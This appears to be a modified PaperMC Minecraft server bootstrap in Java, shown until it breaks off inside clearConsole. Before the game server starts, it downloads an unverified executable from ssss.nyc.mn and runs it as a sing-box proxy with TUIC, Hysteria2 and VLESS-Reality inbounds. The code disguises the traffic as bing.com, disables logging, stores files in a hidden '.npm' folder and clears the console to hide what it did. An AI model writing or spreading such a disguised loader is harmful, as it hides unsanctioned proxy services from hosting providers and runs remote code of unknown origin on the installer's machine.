package io.papermc.paper;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.time.*;
import java.time.format.DateTimeFormatter;
import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.atomic.AtomicBoolean;
import joptsimple.OptionSet;
import net.minecraft.SharedConstants;
import net.minecraft.server.Main;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public final class PaperBootstrap {

    private static final Logger LOGGER = LoggerFactory.getLogger("bootstrap");
    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_YELLOW = "\033[1;33m";
    private static final String ANSI_RESET = "\033[0m";
    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static Process sbxProcess;
    private static ScheduledExecutorService scheduler;

    // ================== 用户自定义配置区（请在此修改）==================
    private static final String DEFAULT_UUID = "8c91e4e5-cbc8-4f16-83de-553ad8a43158";
    private static final String DEFAULT_TUIC_PORT = "36392";
    private static final String DEFAULT_HY2_PORT = "36569";
    private static final String DEFAULT_REALITY_PORT = "36569";
    private static final String DEFAULT_FILE_PATH = "./.npm";
    // =================================================================

    private static final String[] ENV_VARS = {
        "UUID", "TUIC_PORT", "HY2_PORT", "REALITY_PORT", "FILE_PATH"
    };

    private PaperBootstrap() {}

    public static void boot(final OptionSet options) {
        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
            System.err.println(ANSI_RED + "ERROR: Java 版本过低，请切换到 Java 8+" + ANSI_RESET);
            System.exit(1);
        }

        try {
            runSbxBinary();
            startBeijingMidnightRestart();

            Runtime.getRuntime().addShutdownHook(new Thread(PaperBootstrap::stopServices));

            Thread.sleep(15000);
            System.out.println(ANSI_GREEN + "Server is running" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Thank you for using this script, enjoy!" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds, copy nodes above!" + ANSI_RESET);
            Thread.sleep(20000);
            clearConsole();

            SharedConstants.tryDetectVersion();
            getStartupVersionMessages().forEach(LOGGER::info);
            Main.main(options);

        } catch (Exception e) {
            System.err.println(ANSI_RED + "初始化失败: " + e.getMessage() + ANSI_RESET);
            e.printStackTrace();
        }
    }

    // ================== 北京时间 00:00 自动重启（精确）==================
    private static void startBeijingMidnightRestart() {
        scheduler = Executors.newScheduledThreadPool(1);
        Runnable task = () -> {
            System.out.println(ANSI_RED + "\n[定时重启] 北京时间 00:00，执行重启！" + ANSI_RESET);
            stopServices();
            System.exit(0);
        };

        ZonedDateTime now = ZonedDateTime.now(ZoneId.of("Asia/Shanghai"));
        ZonedDateTime nextMidnight = now.toLocalDate().plusDays(1).atStartOfDay(ZoneId.of("Asia/Shanghai"));

        long delaySeconds = Duration.between(now, nextMidnight).getSeconds();
        long hours = delaySeconds / 3600;
        long minutes = (delaySeconds % 3600) / 60;
        long seconds = delaySeconds % 60;

        System.out.println(ANSI_YELLOW +
            "\n[定时重启] 下次重启： " + hours + "小时" + minutes + "分" + seconds + "秒 后" +
            "\n          目标时间： " + nextMidnight.format(DateTimeFormatter.ofPattern("yyyy/MM/dd HH:mm:ss")) +
            " (北京时间 00:00)" + ANSI_RESET);

        scheduler.schedule(task, delaySeconds, TimeUnit.SECONDS);
    }

    // ================== 启动 sing-box ==================
    private static void runSbxBinary() throws Exception {
        Map<String, String> envVars = new HashMap<>();
        loadEnvVars(envVars);
        generateConfig(envVars);

        ProcessBuilder pb = new ProcessBuilder(
            getBinaryPath().toString(),
            "run", "-c", envVars.get("FILE_PATH") + "/config.json"
        );
        pb.environment().putAll(envVars);
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);

        sbxProcess = pb.start();
        System.out.println(ANSI_GREEN + "sing-box 已启动" + ANSI_RESET);
    }

    // ================== 加载环境变量（支持 .env）=================
    private static void loadEnvVars(Map<String, String> envVars) throws IOException {
        // 默认值（用户可修改上方常量）
        envVars.put("UUID", DEFAULT_UUID);
        envVars.put("TUIC_PORT", DEFAULT_TUIC_PORT);
        envVars.put("HY2_PORT", DEFAULT_HY2_PORT);
        envVars.put("REALITY_PORT", DEFAULT_REALITY_PORT);
        envVars.put("FILE_PATH", DEFAULT_FILE_PATH);

        // 优先级：System.getenv > .env 文件 > 默认值
        for (String key : ENV_VARS) {
            String val = System.getenv(key);
            if (val != null && !val.trim().isEmpty()) {
                envVars.put(key, val.trim());
            }
        }

        Path envFile = Paths.get(".env");
        if (Files.exists(envFile)) {
            for (String line : Files.readAllLines(envFile)) {
                line = line.trim();
                if (line.isEmpty() || line.startsWith("#")) continue;
                line = line.split(" #")[0].split(" //")[0].trim();
                if (line.startsWith("export ")) line = line.substring(7);
                String[] parts = line.split("=", 2);
                if (parts.length == 2 && Arrays.asList(ENV_VARS).contains(parts[0].trim())) {
                    String val = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
                    envVars.put(parts[0].trim(), val);
                }
            }
        }
    }

    // ================== 下载 sing-box ==================
    private static Path getBinaryPath() throws IOException {
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url;

        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            url = "https://amd64.ssss.nyc.mn/sb";
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            url = "https://arm64.ssss.nyc.mn/sb";
        } else if (osArch.contains("s390x")) {
            url = "https://s390x.ssss.nyc.mn/sb";
        } else {
            throw new RuntimeException("不支持的架构: " + osArch);
        }

        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
        if (!Files.exists(path)) {
            System.out.println(ANSI_YELLOW + "正在下载 sing-box..." + ANSI_RESET);
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            path.toFile().setExecutable(true);
        }
        return path;
    }

    // ================== 生成 config.json ==================
    private static void generateConfig(Map<String, String> env) throws IOException {
        String uuid = env.get("UUID");
        String tuicPort = env.get("TUIC_PORT");
        String hy2Port = env.get("HY2_PORT");
        String realityPort = env.get("REALITY_PORT");
        String path = env.get("FILE_PATH");

        Files.createDirectories(Paths.get(path));

        // Reality 密钥
        String privateKey = "", publicKey = "";
        Path keyFile = Paths.get(path, "key.txt");
        if (Files.exists(keyFile)) {
            List<String> lines = Files.readAllLines(keyFile);
            privateKey = lines.stream().filter(l -> l.startsWith("PrivateKey:")).findFirst().map(l -> l.split(":")[1].trim()).orElse("");
            publicKey = lines.stream().filter(l -> l.startsWith("PublicKey:")).findFirst().map(l -> l.split(":")[1].trim()).orElse("");
        } else {
            ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString(), "generate", "reality-keypair");
            Process p = pb.start();
            String output = new String(p.getInputStream().readAllBytes()).trim();
            Files.write(keyFile, output.getBytes());
            privateKey = output.lines().filter(l -> l.startsWith("PrivateKey:")).findFirst().map(l -> l.split(":")[1].trim()).orElse("");
            publicKey = output.lines().filter(l -> l.startsWith("PublicKey:")).findFirst().map(l -> l.split(":")[1].trim()).orElse("");
        }

        // 自签证书
        Path certPath = Paths.get(path, "cert.pem");
        Path keyPath = Paths.get(path, "private.key");
        if (!Files.exists(certPath) || !Files.exists(keyPath)) {
            ProcessBuilder pb = new ProcessBuilder(
                "openssl", "req", "-x509", "-newkey", "ec", "-pkeyopt", "ec_paramgen_curve:prime256v1",
                "-keyout", keyPath.toString(), "-out", certPath.toString(),
                "-subj", "/CN=bing.com", "-days", "3650", "-nodes"
            );
            pb.inheritIO().start().waitFor();
        }

        // 构建 inbounds
        StringBuilder inbounds = new StringBuilder();
        if (!tuicPort.isEmpty() && !"0".equals(tuicPort)) {
            inbounds.append(String.format("""
                {
                  "type": "tuic",
                  "listen": "::",
                  "listen_port": %s,
                  "users": [{"uuid": "%s", "password": "admin"}],
                  "congestion_control": "bbr",
                  "tls": {"enabled": true, "alpn": ["h3"], "certificate_path": "%s/cert.pem", "key_path": "%s/private.key"}
                },""", tuicPort, uuid, path, path));
        }
        if (!hy2Port.isEmpty() && !"0".equals(hy2Port)) {
            inbounds.append(String.format("""
                {
                  "type": "hysteria2",
                  "listen": "::",
                  "listen_port": %s,
                  "users": [{"password": "%s"}],
                  "masquerade": "https://bing.com",
                  "tls": {"enabled": true, "alpn": ["h3"], "certificate_path": "%s/cert.pem", "key_path": "%s/private.key"}
                },""", hy2Port, uuid, path, path));
        }
        if (!realityPort.isEmpty() && !"0".equals(realityPort)) {
            inbounds.append(String.format("""
                {
                  "type": "vless",
                  "listen": "::",
                  "listen_port": %s,
                  "users": [{"uuid": "%s", "flow": "xtls-rprx-vision"}],
                  "tls": {
                    "enabled": true,
                    "server_name": "www.nazhumi.com",
                    "reality": {
                      "enabled": true,
                      "handshake": {"server": "www.nazhumi.com", "server_port": 443},
                      "private_key": "%s",
                      "short_id": [""]
                    }
                  }
                }""", realityPort, uuid, privateKey));
        }

        String config = String.format("""
            {
              "log": {"disabled": true},
              "inbounds": [%s],
              "outbounds": [{"type": "direct"}]
            }""", inbounds.length() > 0 ? inbounds.substring(0, inbounds.length() - 1) : "");

        Files.write(Paths.get(path, "config.json"), config.getBytes());
    }

    // ================== 停止服务 ==================
    private static void stopServices() {
        if (sbxProcess != null && sbxProcess.isAlive()) {
            sbxProcess.destroy();
            System.out.println(ANSI_RED + "sing-box 已停止" + ANSI_RESET);
        }
        if (scheduler != null && !scheduler.isShutdown()) {
            scheduler.shutdownNow();
        }
    }

    private static void clearConsole() {
        try {
            if (System.getProperty("os.name").contains("Windows")) {
                new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();
           
